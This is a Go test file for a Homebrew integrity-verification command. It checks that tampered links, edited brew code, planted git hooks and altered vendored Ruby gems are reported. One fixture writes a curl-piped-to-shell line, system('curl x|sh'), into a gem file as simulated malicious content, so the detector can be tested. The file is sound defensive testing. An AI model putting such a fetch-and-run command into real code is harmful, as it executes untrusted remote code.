package cli

import (
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/chain305/chainsaw-core/homebrew"
)

// verifyPrefix builds a minimal prefix: jq linked into bin/, and a brew
// checkout (Library/Homebrew + .git/HEAD) at the prefix itself.
func verifyPrefix(t *testing.T) string {
	t.Helper()
	p := t.TempDir()
	must := func(err error) {
		if err != nil {
			t.Fatal(err)
		}
	}
	must(os.MkdirAll(filepath.Join(p, "Cellar/jq/1.8.2/bin"), 0o755))
	must(os.WriteFile(filepath.Join(p, "Cellar/jq/1.8.2/bin/jq"), []byte("x"), 0o755))
	must(os.MkdirAll(filepath.Join(p, "var/homebrew/linked"), 0o755))
	must(os.Symlink("../../../Cellar/jq/1.8.2", filepath.Join(p, "var/homebrew/linked/jq")))
	must(os.MkdirAll(filepath.Join(p, "bin"), 0o755))
	must(os.Symlink("../Cellar/jq/1.8.2/bin/jq", filepath.Join(p, "bin/jq")))
	must(os.MkdirAll(filepath.Join(p, "Library/Homebrew"), 0o755))
	must(os.WriteFile(filepath.Join(p, "Library/Homebrew/brew.rb"), []byte("hello\n"), 0o644))
	must(os.MkdirAll(filepath.Join(p, ".git"), 0o755))
	must(os.WriteFile(filepath.Join(p, ".git/HEAD"), []byte(strings.Repeat("a", 40)+"\n"), 0o644))
	must(os.WriteFile(filepath.Join(p, ".git/config"), []byte("[core]\n\tfsmonitor = false\n"), 0o644))
	writeRubyVendor(t, p)
	return p
}

// The portable Ruby and gem fixture, and the manifests the stub serves.
const gemfileLock = "GEM\n  specs:\n\nCHECKSUMS\n  json (2.21.2) sha256=" + jsonPinSHA + "\n  rubocop (1.0.0) sha256=dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\n\nBUNDLED WITH\n"

const (
	rubyPinSHA = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
	jsonPinSHA = "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
)

var (
	rubyFixture = map[string]string{"bin/ruby": "ELF", "lib/ruby/4.0.0/set.rb": "class Set; end\n", "lib/libruby.4.0.dylib": "dylib", "README": "docs"}
	jsonFixture = map[string]string{"lib/json.rb": "module JSON; end\n", "README.md": "docs", "test/json_test.rb": "test"}
)

func writeRubyVendor(t *testing.T, repo string) {
	t.Helper()
	v := homebrew.VendorDir(repo)
	w := func(rel, body string, mode os.FileMode) {
		t.Helper()
		f := filepath.Join(v, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(f), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(f, []byte(body), mode); err != nil {
			t.Fatal(err)
		}
	}
	w("portable-ruby-version", "4.0.9\n", 0o644)
	w("portable-ruby-"+portableRubyArch(repo), "ruby_TAG=arm64_big_sur\nruby_SHA="+rubyPinSHA+"\n", 0o644)
	for rel, body := range rubyFixture {
		mode := os.FileMode(0o644)
		if rel == "bin/ruby" {
			mode = 0o755
		}
		w("portable-ruby/4.0.9/"+rel, body, mode)
	}
	if err := os.Symlink("libruby.4.0.dylib", filepath.Join(v, "portable-ruby/4.0.9/lib/libruby.dylib")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("4.0.9", filepath.Join(v, "portable-ruby/current")); err != nil {
		t.Fatal(err)
	}
	w("bundle/bundler/setup.rb", `$:.unshift File.expand_path("#{__dir__}/../#{RUBY_ENGINE}/#{Gem.ruby_api_version}/extensions/arm64-darwin-24/4.0.0-static/json-2.21.2")
$:.unshift File.expand_path("#{__dir__}/../#{RUBY_ENGINE}/#{Gem.ruby_api_version}/gems/json-2.21.2/lib")
$:.unshift File.expand_path("#{__dir__}/../#{RUBY_ENGINE}/#{Gem.ruby_api_version}/gems/rubocop-1.0.0/lib")
`, 0o644)
	if err := os.WriteFile(filepath.Join(repo, "Library/Homebrew/Gemfile.lock"), []byte(gemfileLock), 0o644); err != nil {
		t.Fatal(err)
	}
	for rel, body := range jsonFixture {
		w("bundle/ruby/4.0.0/gems/json-2.21.2/"+rel, body, 0o644)
	}
}

func fixtureManifest(prefix string, files map[string]string, execs ...string) []homebrew.VendorFile {
	var out []homebrew.VendorFile
	for rel, body := range files {
		sum := sha256.Sum256([]byte(body))
		out = append(out, homebrew.VendorFile{Path: prefix + rel, SHA256: hex.EncodeToString(sum[:]), Exec: slices.Contains(execs, rel)})
	}
	return out
}

// stubVendor serves the fixture manifests; gem answers override per gem dir.
func stubVendor(t *testing.T, gem map[string]any) *[]string {
	t.Helper()
	old := brewVerifyFetchVendor
	t.Cleanup(func() { brewVerifyFetchVendor = old })
	var queries []string
	brewVerifyFetchVendor = func(q string, out any) error {
		queries = append(queries, q)
		var m any
		switch q {
		case "kind=portable-ruby&sha256=" + rubyPinSHA:
			files := append(fixtureManifest("portable-ruby/4.0.9/", rubyFixture, "bin/ruby"),
				homebrew.VendorFile{Path: "portable-ruby/4.0.9/lib/libruby.dylib", Link: "libruby.4.0.dylib"})
			m = map[string]any{"files": files}
		case "kind=gem&name=json-2.21.2&sha256=" + jsonPinSHA:
			m = map[string]any{"files": fixtureManifest("", jsonFixture), "extensions": true}
			if gem["json"] != nil {
				m = gem["json"]
			}
		default:
			return errors.New("unexpected manifest query " + q)
		}
		if err, ok := m.(error); ok {
			return err
		}
		b, _ := json.Marshal(m)
		return json.Unmarshal(b, out)
	}
	return &queries
}

const policyEnv = "HOMEBREW_SYSTEM_ENV_TAKES_PRIORITY=1\nHOMEBREW_ARTIFACT_DOMAIN_NO_FALLBACK=1\n"

type treeAnswer struct {
	upstream  string
	truncated bool
	err       error
}

func stubVerify(t *testing.T, tree treeAnswer, envBody string, envErr error, localEnv *string) {
	t.Helper()
	oldTree, oldEnv, oldPath, oldSecure, oldNow := brewVerifyFetchTree, brewVerifyFetchEnv, brewVerifyEnvPath, brewVerifyFileSecure, brewVerifyNow
	t.Cleanup(func() {
		brewVerifyFetchTree, brewVerifyFetchEnv, brewVerifyEnvPath, brewVerifyFileSecure, brewVerifyNow = oldTree, oldEnv, oldPath, oldSecure, oldNow
	})
	brewVerifyNow = func() time.Time { return time.Now().Add(time.Hour) }
	oldSleep := brewVerifySleep
	t.Cleanup(func() { brewVerifySleep = oldSleep })
	brewVerifySleep = func(time.Duration) {}
	oldEuid, oldBase := brewVerifyGeteuid, brewLinksBaselineDir
	t.Cleanup(func() { brewVerifyGeteuid, brewLinksBaselineDir = oldEuid, oldBase })
	brewVerifyGeteuid = func() int { return 501 }
	brewLinksBaselineDir = filepath.Join(t.TempDir(), "db")
	brewVerifyFetchTree = func(_ string, out any) error {
		if tree.err != nil {
			return tree.err
		}
		b, _ := json.Marshal(map[string]any{
			"upstream": tree.upstream, "truncated": tree.truncated, "behind": 4000,
			"entries": []homebrew.TreeEntry{
				{Path: "Library/Homebrew/brew.rb", Mode: "100644", SHA: "ce013625030ba8dba906f756967f9e9ca394464a"},
				{Path: "Library/Homebrew/Gemfile.lock", Mode: "100644", SHA: gitBlobSHA(gemfileLock)},
			},
		})
		return json.Unmarshal(b, out)
	}
	brewVerifyFetchEnv = func(string) ([]byte, error) { return []byte(envBody), envErr }
	brewVerifyFileSecure = func(string) error { return nil }
	envPath := filepath.Join(t.TempDir(), "brew.env")
	if localEnv != nil {
		if err := os.WriteFile(envPath, []byte(*localEnv), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	brewVerifyEnvPath = envPath
	stubVendor(t, nil)
}

func ptr(s string) *string { return &s }

func gitBlobSHA(body string) string {
	h := sha1.Sum([]byte(fmt.Sprintf("blob %d\x00%s", len(body), body)))
	return hex.EncodeToString(h[:])
}

func TestVerifyBrewVerdicts(t *testing.T) {
	cases := []struct {
		name     string
		tree     treeAnswer
		envErr   error
		localEnv *string
		mutate   func(p string)
		want     string
	}{
		{name: "clean", tree: treeAnswer{upstream: "ancestor"}, localEnv: ptr(policyEnv), want: brewVerdictClean},
		{name: "link swapped", tree: treeAnswer{upstream: "ancestor"}, localEnv: ptr(policyEnv), want: brewVerdictTamper, mutate: func(p string) {
			os.Remove(filepath.Join(p, "bin/jq"))
			os.WriteFile(filepath.Join(p, "bin/jq"), []byte("evil"), 0o755)
		}},
		{name: "brew code edited", tree: treeAnswer{upstream: "ancestor"}, localEnv: ptr(policyEnv), want: brewVerdictTamper, mutate: func(p string) {
			os.WriteFile(filepath.Join(p, "Library/Homebrew/brew.rb"), []byte("hello\n#\n"), 0o644)
		}},
		{name: "vendored gem edited", tree: treeAnswer{upstream: "ancestor"}, localEnv: ptr(policyEnv), want: brewVerdictTamper, mutate: func(p string) {
			os.WriteFile(filepath.Join(homebrew.VendorDir(p), "bundle/ruby/4.0.0/gems/json-2.21.2/lib/json.rb"), []byte("system('curl x|sh')\n"), 0o644)
		}},
		{name: "HEAD not upstream", tree: treeAnswer{upstream: "not_upstream"}, localEnv: ptr(policyEnv), want: brewVerdictTamper},
		{name: "env file missing", tree: treeAnswer{upstream: "ancestor"}, want: brewVerdictDrift},
		{name: "env undone by later line", tree: treeAnswer{upstream: "ancestor"}, localEnv: ptr(policyEnv + "HOMEBREW_ARTIFACT_DOMAIN_NO_FALLBACK=\n"), want: brewVerdictDrift},
		{name: "brew too old", tree: treeAnswer{upstream: "too_old"}, localEnv: ptr(policyEnv), want: brewVerdictIncomplete},
		{name: "git hook in checkout", tree: treeAnswer{upstream: "ancestor"}, localEnv: ptr(policyEnv), want: brewVerdictTamper, mutate: func(p string) {
			os.MkdirAll(filepath.Join(p, ".git/hooks"), 0o755)
			os.WriteFile(filepath.Join(p, ".git/hooks/post-merge"), []byte("#!/bin/sh\n"), 0o755)
		}},
		{name: "tracked brew file deleted", tree: treeAnswer{upstream: "ancestor"}, localEnv: ptr(policyEnv), want: brewVerdictTamper, mutate: func(p string) {
			os.Remove(filepath.Join(p, "Library/Homebrew/brew.rb"))
		}},
		{name: "server unreachable", tree: treeAnswer{err: errors.New("dial tcp: refused")}, localEnv: ptr(policyEnv), want: brewVerdictError},
		{name: "policy fetch fails", tree: treeAnswer{upstream: "ancestor"}, envErr: errors.New("401"), localEnv: ptr(policyEnv), want: brewVerdictError},
		{name: "tamper outranks error", tree: treeAnswer{err: errors.New("refused")}, localEnv: ptr(policyEnv), want: brewVerdictTamper, mutate: func(p string) {
			os.Remove(filepath.Join(p, "bin/jq"))
			os.Symlink("/tmp/x", filepath.Join(p, "bin/jq"))
		}},
		{name: "truncated tree", tree: treeAnswer{upstream: "ancestor", truncated: true}, localEnv: ptr(policyEnv), want: brewVerdictIncomplete},
		{name: "update in progress", tree: treeAnswer{upstream: "ancestor"}, localEnv: ptr(policyEnv), want: brewVerdictIncomplete, mutate: func(p string) {
			os.WriteFile(filepath.Join(p, ".git/index.lock"), nil, 0o644)
			later := time.Now().Add(time.Hour) // the stub clock; an older lock counts as stale
			os.Chtimes(filepath.Join(p, ".git/index.lock"), later, later)
		}},
		{name: "odd server answer", tree: treeAnswer{upstream: ""}, localEnv: ptr(policyEnv), want: brewVerdictError},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			p := verifyPrefix(t)
			if c.mutate != nil {
				c.mutate(p)
			}
			stubVerify(t, c.tree, policyEnv, c.envErr, c.localEnv)
			res := verifyBrew(p, "homebrew", true, true, false)
			if res.Verdict != c.want {
				t.Fatalf("verdict %s, want %s: tamper=%v errors=%v not_assessed=%v", res.Verdict, c.want, res.Tamper, res.Errors, res.NotAssessed)
			}
		})
	}
}

func TestVerifyBrewNoPrefixIsError(t *testing.T) {
	old := brewVerifyPrefixes
	t.Cleanup(func() { brewVerifyPrefixes = old })
	brewVerifyPrefixes = []string{filepath.Join(t.TempDir(), "none")}
	if res := verifyBrew("", "", true, false, false); res.Verdict != brewVerdictError {
		t.Fatalf("verdict %s", res.Verdict)
	}
}

func TestBrewVerifyExitCodes(t *testing.T) {
	for _, c := range []struct {
		name string
		args []string
		want int
	}{
		{"clean", nil, 0},
		{"tamper", []string{"tamper"}, ExitBlocked},
	} {
		t.Run(c.name, func(t *testing.T) {
			p := verifyPrefix(t)
			oldBase := brewLinksBaselineDir
			t.Cleanup(func() { brewLinksBaselineDir = oldBase })
			brewLinksBaselineDir = filepath.Join(t.TempDir(), "db")
			if len(c.args) > 0 {
				os.Remove(filepath.Join(p, "bin/jq"))
				os.WriteFile(filepath.Join(p, "bin/jq"), []byte("evil"), 0o755)
			}
			out := filepath.Join(t.TempDir(), "r.json")
			cmd := brewVerifyCmd
			cmd.Flags().Set("links", "true")
			cmd.Flags().Set("prefix", p)
			cmd.Flags().Set("out", out)
			t.Cleanup(func() {
				cmd.Flags().Set("links", "false")
				cmd.Flags().Set("prefix", "")
				cmd.Flags().Set("out", "")
			})
			var sb strings.Builder
			cmd.SetOut(&sb)
			err := runBrewVerify(cmd, nil)
			code := 0
			var ec *ExitCodeError
			if errors.As(err, &ec) {
				code = ec.Code
			}
			if code != c.want {
				t.Fatalf("exit %d, want %d (%v)\n%s", code, c.want, err, sb.String())
			}
			b, rerr := os.ReadFile(out)
			if rerr != nil || !strings.Contains(string(b), `"schema": "`+BrewVerifySchema+`"`) {
				t.Fatalf("--out not written: %v %s", rerr, b)
			}
		})
	}
}

func TestVerifyLinksBaseline(t *testing.T) {
	swap := func(p string) {
		os.Remove(filepath.Join(p, "var/homebrew/linked/jq"))
		os.Remove(filepath.Join(p, "bin/jq"))
		os.WriteFile(filepath.Join(p, "bin/jq"), []byte("evil"), 0o755)
	}
	t.Run("root run records; a later swap with the record deleted is tamper", func(t *testing.T) {
		p := verifyPrefix(t)
		stubVerify(t, treeAnswer{upstream: "ancestor"}, policyEnv, nil, ptr(policyEnv))
		brewVerifyGeteuid = func() int { return 0 }
		if res := verifyBrew(p, "", true, false, false); res.Verdict != brewVerdictClean {
			t.Fatalf("first run %s %v %v", res.Verdict, res.Tamper, res.Errors)
		}
		swap(p)
		if res := verifyBrew(p, "", true, false, false); res.Verdict != brewVerdictTamper {
			t.Fatalf("swap after baseline: %s %v", res.Verdict, res.Errors)
		}
	})
	t.Run("user run never writes the baseline", func(t *testing.T) {
		p := verifyPrefix(t)
		stubVerify(t, treeAnswer{upstream: "ancestor"}, policyEnv, nil, ptr(policyEnv))
		verifyBrew(p, "", true, false, false)
		if ents, _ := os.ReadDir(brewLinksBaselineDir); len(ents) != 0 {
			t.Fatalf("non-root wrote %v", ents)
		}
		swap(p)
		if res := verifyBrew(p, "", true, false, false); res.Verdict != brewVerdictClean {
			t.Fatalf("no baseline: the deleted record hides the swap (documented TOFU limit), got %s", res.Verdict)
		}
	})
	t.Run("baseline a user could write is tamper and not rewritten", func(t *testing.T) {
		p := verifyPrefix(t)
		stubVerify(t, treeAnswer{upstream: "ancestor"}, policyEnv, nil, ptr(policyEnv))
		brewVerifyGeteuid = func() int { return 0 }
		verifyBrew(p, "", true, false, false)
		ents, _ := os.ReadDir(brewLinksBaselineDir)
		path := filepath.Join(brewLinksBaselineDir, ents[0].Name())
		os.WriteFile(path, []byte("{}"), 0o644)
		brewVerifyFileSecure = func(string) error { return errors.New("owned by uid 501, not root") }
		if res := verifyBrew(p, "", true, false, false); res.Verdict != brewVerdictTamper {
			t.Fatalf("insecure baseline: %s", res.Verdict)
		}
		if b, _ := os.ReadFile(path); string(b) != "{}" {
			t.Fatalf("untrusted baseline was overwritten: %s", b)
		}
	})
	t.Run("reset re-records", func(t *testing.T) {
		p := verifyPrefix(t)
		stubVerify(t, treeAnswer{upstream: "ancestor"}, policyEnv, nil, ptr(policyEnv))
		brewVerifyGeteuid = func() int { return 0 }
		verifyBrew(p, "", true, false, false)
		os.Remove(filepath.Join(p, "var/homebrew/linked/jq"))
		os.Remove(filepath.Join(p, "bin/jq"))
		os.WriteFile(filepath.Join(p, "bin/jq"), []byte("mine now"), 0o755)
		if res := verifyBrew(p, "", true, false, true); res.Verdict != brewVerdictClean {
			t.Fatalf("reset run: %s %v", res.Verdict, res.Tamper)
		}
		if res := verifyBrew(p, "", true, false, false); res.Verdict != brewVerdictClean {
			t.Fatalf("after reset: %s %v", res.Verdict, res.Tamper)
		}
	})
	t.Run("reset needs root", func(t *testing.T) {
		stubVerify(t, treeAnswer{upstream: "ancestor"}, policyEnv, nil, ptr(policyEnv))
		cmd := brewVerifyCmd
		cmd.Flags().Set("reset-baseline", "true")
		t.Cleanup(func() { cmd.Flags().Set("reset-baseline", "false") })
		var ec *ExitCodeError
		if err := runBrewVerify(cmd, nil); !errors.As(err, &ec) || ec.Code != ExitOpError {
			t.Fatalf("non-root reset: %v", err)
		}
	})
}

func TestBrewVerifyAttest(t *testing.T) {
	run := func(t *testing.T, tamper bool, postErr error) (map[string]any, int, string) {
		p := verifyPrefix(t)
		if tamper {
			os.Remove(filepath.Join(p, "bin/jq"))
			os.WriteFile(filepath.Join(p, "bin/jq"), []byte("evil"), 0o755)
		}
		stubVerify(t, treeAnswer{upstream: "ancestor"}, policyEnv, nil, ptr(policyEnv))
		var sent map[string]any
		old := brewVerifyPostRoot
		t.Cleanup(func() { brewVerifyPostRoot = old })
		brewVerifyPostRoot = func(body any) error {
			b, _ := json.Marshal(body)
			_ = json.Unmarshal(b, &sent)
			return postErr
		}
		cmd := brewVerifyCmd
		out := filepath.Join(t.TempDir(), "r.json")
		for k, v := range map[string]string{"links": "true", "prefix": p, "attest": "true", "device-id": "mac/alice", "out": out} {
			cmd.Flags().Set(k, v)
		}
		t.Cleanup(func() {
			for k, v := range map[string]string{"links": "false", "prefix": "", "attest": "false", "device-id": "", "out": ""} {
				cmd.Flags().Set(k, v)
			}
		})
		var sb strings.Builder
		cmd.SetOut(&sb)
		cmd.SetErr(&sb)
		code := 0
		var ec *ExitCodeError
		if err := runBrewVerify(cmd, nil); errors.As(err, &ec) {
			code = ec.Code
		}
		b, _ := os.ReadFile(out)
		return sent, code, string(b)
	}
	t.Run("tamper is posted as drifted", func(t *testing.T) {
		sent, code, _ := run(t, true, nil)
		eco, _ := sent["ecosystems"].(map[string]any)
		st, _ := eco[brewIntegrityName].(map[string]any)
		if sent["device_id"] != "mac/alice" || st["status"] != "drifted" || code != ExitBlocked {
			t.Fatalf("sent %v exit %d", sent, code)
		}
	})
	t.Run("clean but undelivered exits 2", func(t *testing.T) {
		sent, code, out := run(t, false, errors.New("403 forbidden"))
		eco, _ := sent["ecosystems"].(map[string]any)
		st, _ := eco[brewIntegrityName].(map[string]any)
		if st["status"] != "compliant" || code != ExitOpError || !strings.Contains(out, "attest_error") {
			t.Fatalf("sent %v exit %d out %s", sent, code, out)
		}
	})
}

func TestVerifyRubyVendor(t *testing.T) {
	vendor := func(p string) string { return homebrew.VendorDir(p) }
	gemDir := func(p string) string { return filepath.Join(vendor(p), "bundle/ruby/4.0.0/gems/json-2.21.2") }
	cases := []struct {
		name   string
		mutate func(p string)
		gem    any // overrides the json manifest
		check  func(t *testing.T, res *brewVerifyResult)
	}{
		{name: "clean", check: func(t *testing.T, res *brewVerifyResult) {
			if len(res.Tamper)+len(res.Errors)+len(res.NotAssessed) != 0 || res.Ruby.Gems != 1 || res.Ruby.Files != 8 || res.Ruby.Version != "4.0.9" {
				t.Fatalf("%+v %+v", res, res.Ruby)
			}
		}},
		{name: "gem file edited", mutate: func(p string) {
			os.WriteFile(filepath.Join(gemDir(p), "lib/json.rb"), []byte("evil"), 0o644)
		}, check: wantTamper("json-2.21.2/lib/json.rb")},
		{name: "rb dropped into a gem", mutate: func(p string) {
			os.WriteFile(filepath.Join(gemDir(p), "lib/json/ext.rb"), []byte("evil"), 0o644)
		}, check: wantTamper("lib/json/ext.rb")},
		{name: "rb dropped into ruby", mutate: func(p string) {
			os.WriteFile(filepath.Join(vendor(p), "portable-ruby/4.0.9/lib/ruby/4.0.0/rubygems.rb"), []byte("evil"), 0o644)
		}, check: wantTamper("rubygems.rb")},
		{name: "ruby binary swapped", mutate: func(p string) {
			os.WriteFile(filepath.Join(vendor(p), "portable-ruby/4.0.9/bin/ruby"), []byte("ELF2"), 0o755)
		}, check: wantTamper("bin/ruby")},
		{name: "dylib link repointed", mutate: func(p string) {
			l := filepath.Join(vendor(p), "portable-ruby/4.0.9/lib/libruby.dylib")
			os.Remove(l)
			os.Symlink("/tmp/evil.dylib", l)
		}, check: wantTamper("libruby.dylib")},
		{name: "gem file deleted", mutate: func(p string) {
			os.Remove(filepath.Join(gemDir(p), "lib/json.rb"))
		}, check: wantTamper("lib/json.rb: missing")},
		{name: "gem lib dir swapped for a symlink", mutate: func(p string) {
			other := t.TempDir()
			os.WriteFile(filepath.Join(other, "json.rb"), []byte(jsonFixture["lib/json.rb"]), 0o644)
			os.RemoveAll(filepath.Join(gemDir(p), "lib"))
			os.Symlink(other, filepath.Join(gemDir(p), "lib"))
		}, check: wantTamper("json-2.21.2/lib: directory replaced")},
		{name: "gem test file pruned", mutate: func(p string) {
			os.RemoveAll(filepath.Join(gemDir(p), "test"))
		}, check: wantClean},
		{name: "ruby file deleted", mutate: func(p string) {
			os.Remove(filepath.Join(vendor(p), "portable-ruby/4.0.9/lib/ruby/4.0.0/set.rb"))
		}, check: wantTamper("set.rb: missing")},
		{name: "rb in a new subdirectory of a gem", mutate: func(p string) {
			os.MkdirAll(filepath.Join(gemDir(p), "lib/rubocop/cop"), 0o755)
			os.WriteFile(filepath.Join(gemDir(p), "lib/rubocop/cop/base.rb"), []byte("evil"), 0o644)
		}, check: wantTamper("lib/rubocop/cop/base.rb")},
		{name: "data file edited", mutate: func(p string) {
			os.WriteFile(filepath.Join(gemDir(p), "README.md"), []byte("changed"), 0o644)
		}, check: wantTamper("README.md: content differs")},
		{name: "rb planted in an extension dir", mutate: func(p string) {
			d := filepath.Join(vendor(p), "bundle/ruby/4.0.0/extensions/arm64-darwin-24/4.0.0-static/json-2.21.2")
			os.MkdirAll(d, 0o755)
			os.WriteFile(filepath.Join(d, "gem.build_complete"), nil, 0o644)
			os.WriteFile(filepath.Join(d, "open3.rb"), []byte("evil"), 0o644)
		}, check: wantTamper("json-2.21.2/open3.rb")},
		{name: "gem loaded from a subdirectory of lib", mutate: func(p string) {
			setup := filepath.Join(vendor(p), "bundle/bundler/setup.rb")
			b, _ := os.ReadFile(setup)
			os.WriteFile(setup, []byte(strings.Replace(string(b), "gems/json-2.21.2/lib\")", "gems/json-2.21.2/lib/json\")", 1)), 0o644)
			os.MkdirAll(filepath.Join(gemDir(p), "lib/json/net"), 0o755)
			os.WriteFile(filepath.Join(gemDir(p), "lib/json/net/http.rb"), []byte("evil"), 0o644)
		}, check: wantTamper("lib/json/net/http.rb")},
		{name: "current points at another version", mutate: func(p string) {
			c := filepath.Join(vendor(p), "portable-ruby/current")
			os.Remove(c)
			os.Symlink("4.0.8", c)
		}, check: func(t *testing.T, res *brewVerifyResult) {
			if len(res.Tamper) != 0 || len(res.NotAssessed) != 1 || !strings.Contains(res.NotAssessed[0], "4.0.8") {
				t.Fatalf("%+v", res)
			}
		}},
		{name: "current points outside", mutate: func(p string) {
			c := filepath.Join(vendor(p), "portable-ruby/current")
			os.Remove(c)
			os.Symlink("/opt/evil", c)
		}, check: wantTamper("portable-ruby/current")},
		{name: "no portable ruby (system ruby)", mutate: func(p string) {
			os.Remove(filepath.Join(vendor(p), "portable-ruby/current"))
		}, check: func(t *testing.T, res *brewVerifyResult) {
			if len(res.Tamper) != 0 || len(res.NotAssessed) != 1 || !strings.Contains(res.NotAssessed[0], "does not run portable Ruby") {
				t.Fatalf("%+v", res)
			}
		}},
		{name: "no gem dirs where expected", mutate: func(p string) {
			os.RemoveAll(filepath.Join(vendor(p), "bundle/ruby/4.0.0"))
		}, check: func(t *testing.T, res *brewVerifyResult) {
			if len(res.Tamper) != 0 || len(res.NotAssessed) != 1 || !strings.Contains(res.NotAssessed[0], "none of the gem directories") {
				t.Fatalf("%+v", res)
			}
		}},
		{name: "current is a directory", mutate: func(p string) {
			c := filepath.Join(vendor(p), "portable-ruby/current")
			os.Remove(c)
			os.MkdirAll(c, 0o755)
		}, check: wantTamper("portable-ruby/current")},
		{name: "gem yanked upstream", gem: map[string]any{"unavailable": "rubygems.org answered 404"}, check: func(t *testing.T, res *brewVerifyResult) {
			if len(res.Tamper) != 0 || len(res.NotAssessed) != 1 || res.Ruby.Gems != 0 {
				t.Fatalf("%+v", res)
			}
		}},
		{name: "gem without checksum", mutate: func(p string) {
			lock := filepath.Join(p, "Library/Homebrew/Gemfile.lock")
			b, _ := os.ReadFile(lock)
			os.WriteFile(lock, []byte(strings.Replace(string(b), "  json (2.21.2) sha256="+jsonPinSHA+"\n", "", 1)), 0o644)
		}, check: func(t *testing.T, res *brewVerifyResult) {
			if len(res.Tamper) != 0 || len(res.NotAssessed) != 1 || !strings.Contains(res.NotAssessed[0], "no checksum") {
				t.Fatalf("%+v", res)
			}
		}},
		{name: "manifest fetch fails", gem: errors.New("503"), check: func(t *testing.T, res *brewVerifyResult) {
			if len(res.Errors) != 1 || len(res.Tamper) != 0 {
				t.Fatalf("%+v", res)
			}
		}},
		{name: "compiled bundle in a gem with extensions", mutate: func(p string) {
			os.WriteFile(filepath.Join(gemDir(p), "lib/json/ext/parser.bundle"), []byte("macho"), 0o755)
			os.MkdirAll(filepath.Join(vendor(p), "bundle/ruby/4.0.0/extensions/arm64-darwin-24/4.0.0-static/json-2.21.2"), 0o755)
		}, check: func(t *testing.T, res *brewVerifyResult) {
			if len(res.Tamper) != 0 || !slices.Contains(res.Ruby.NotCompared, "json-2.21.2") || len(res.Ruby.Findings) != 1 || res.Ruby.Findings[0].Severity != homebrew.SeverityWarn {
				t.Fatalf("%+v %+v", res, res.Ruby)
			}
		}},
		{name: "compiled bundle in a gem without extensions", gem: map[string]any{"files": fixtureManifest("", jsonFixture)}, mutate: func(p string) {
			os.WriteFile(filepath.Join(gemDir(p), "lib/json/ext/parser.bundle"), []byte("macho"), 0o755)
		}, check: wantTamper("parser.bundle")},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			p := verifyPrefix(t)
			os.MkdirAll(filepath.Join(gemDir(p), "lib/json/ext"), 0o755)
			if c.mutate != nil {
				c.mutate(p)
			}
			var gem map[string]any
			if c.gem != nil {
				gem = map[string]any{"json": c.gem}
			}
			stubVendor(t, gem)
			res := &brewVerifyResult{}
			verifyRubyVendor(res, p, p, "")
			c.check(t, res)
		})
	}
}

func wantTamper(sub string) func(*testing.T, *brewVerifyResult) {
	return func(t *testing.T, res *brewVerifyResult) {
		t.Helper()
		for _, m := range res.Tamper {
			if strings.Contains(m, sub) {
				return
			}
		}
		t.Fatalf("no tamper naming %s: tamper=%v errors=%v not_assessed=%v", sub, res.Tamper, res.Errors, res.NotAssessed)
	}
}

func wantClean(t *testing.T, res *brewVerifyResult) {
	t.Helper()
	if len(res.Tamper)+len(res.Errors)+len(res.NotAssessed) != 0 {
		t.Fatalf("%+v", res)
	}
}

// A checkout that is not upstream's cannot vouch for its own pins.
func TestRubyVendorSkippedWhenCodeTampered(t *testing.T) {
	p := verifyPrefix(t)
	os.WriteFile(filepath.Join(p, "Library/Homebrew/brew.rb"), []byte("evil\n"), 0o644)
	stubVerify(t, treeAnswer{upstream: "ancestor"}, policyEnv, nil, ptr(policyEnv))
	q := stubVendor(t, nil)
	res := verifyBrew(p, "homebrew", true, true, false)
	if res.Ruby != nil || len(*q) != 0 {
		t.Fatalf("ruby compared against pins from a tampered checkout: %+v %v", res.Ruby, *q)
	}
}
